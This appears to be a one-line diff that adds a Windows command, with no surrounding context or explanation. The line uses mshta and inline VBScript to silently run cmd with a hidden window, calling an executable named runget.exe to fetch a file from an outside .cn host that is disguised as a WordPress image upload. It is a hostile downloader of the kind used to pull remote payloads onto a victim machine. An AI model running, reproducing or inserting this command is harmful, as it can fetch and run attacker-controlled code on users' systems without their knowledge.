@@ -1,0 +1,1 @@
+mshta vbscript:CreateObject("WScript.Shell").Run("cmd /c runget.exe http://vuuuv.cn/wp-content/uploads/2016/10/cropped-2016100203182232-270x270.jpg",0)(window.close)
